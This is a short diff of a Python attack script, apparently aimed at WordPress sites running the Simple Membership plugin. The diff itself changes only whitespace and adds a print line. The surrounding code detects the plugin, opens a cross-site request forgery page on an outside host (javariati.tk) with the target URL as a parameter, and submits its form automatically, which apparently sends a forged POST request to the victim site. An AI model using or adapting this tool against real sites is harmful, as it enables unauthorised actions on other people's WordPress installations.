@@ -48,7 +48,7 @@ while exit != "y":
             title = soupParser.findAll("h1", {"class": "entry-title"})
         except:
             title = None
-            
+
         #Is it Simple WordPress Membership?
         if len(title) > 0:
             print("This has the Simple Membership plugin")
@@ -216,7 +216,9 @@ while exit != "y":
             browser.open("http://javariati.tk/matteo/InfoSec/CSRF.php?url=" + url)
 
             browser.select_form(nr = 0)
-            
+
+            print("Selecting the form and submitting the POST request")
+
             browser.submit()
             #form is automatically submitted
 
